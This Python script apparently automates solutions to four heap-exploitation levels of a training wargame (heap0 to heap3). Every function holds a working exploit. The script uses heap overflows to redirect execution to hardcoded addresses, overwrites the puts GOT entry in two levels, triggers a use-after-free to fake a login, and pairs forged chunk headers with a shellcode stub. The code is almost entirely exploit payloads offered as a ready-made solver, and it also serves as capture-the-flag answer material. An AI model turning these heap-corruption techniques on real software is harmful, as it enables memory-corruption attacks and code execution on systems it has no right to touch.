import protopwn as p
import struct
from subprocess import Popen, PIPE

#------------------------+
# call winner() function |
#------------------------+
def heap0():
	name = "heap0"
	p.start(name)
	path = p.PATH + name
	
	payload = "A" * 72
	payload += struct.pack("I", 0x08048464)

	proc = Popen([path, payload], stdin=PIPE, stdout=PIPE)
	out = proc.communicate()

	if "passed" in out[0]:
		p.content(out[0].replace("\n", " "))
		p.ok("solved !")
	else:
		p.err("failed")

#------------------------+
# call winner() function |
#------------------------+
def heap1():
	name = "heap1"
	p.start(name)
	path = p.PATH + name

	win  = struct.pack("I", 0x08048494)
	puts_got_addr = struct.pack("I", 0x08049774)

	padding = "A" * 20
	target = padding + puts_got_addr

	proc = Popen([path, target, win], stdin=PIPE, stdout=PIPE)
	out = proc.communicate()

	if "winner" in out[0]:
		p.content(out[0])
		p.ok("solved !")
	else:
		p.err("failed")


#----------------------+
# log into the program |
#----------------------+
def heap2():
	name = "heap2"
	p.start(name)
	path = p.PATH + name

	cmd = "auth test\n"
	cmd += "reset\n"
	cmd += "service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
	cmd += "login\n"

	proc = Popen(path, stdin=PIPE, stdout=PIPE)
	out = proc.communicate(cmd)

	if "logged" in out[0]:
		p.content("you have logged in already!")
		p.ok("solved !")
	else:
		p.err("failed")

#------------------------+
# call winner() function |
#------------------------+
def heap3():
	name = "heap3"
	p.start(name)
	path = p.PATH + name

	padding = "AAAA"
	shellcode = "\x68\x64\x88\x04\x08\xc3"
	buf1 = padding + shellcode
	
	padding1 = "A" * 32
	prev_sz = "\xfc\xff\xff\xff" 
	sz = "\xfc\xff\xff\xff"
	padding2 = "A" * 4 
	puts_got = "\x1c\xb1\x04\x08"
	shellcode_start = "\x0c\xc0\x04\x08"

	buf2 = padding1 + prev_sz + sz + padding2 + puts_got + shellcode_start
	
	proc = Popen([path, buf1, buf2, "AAA"], stdin=PIPE, stdout=PIPE)
	out = proc.communicate()

	if "too bad" in out[0]:
		p.content(out[0])
		p.ok("solved !")
	else:
		p.err("failed")

def heap_solve():
	heap0()
	heap1()
	heap2()
	heap3()
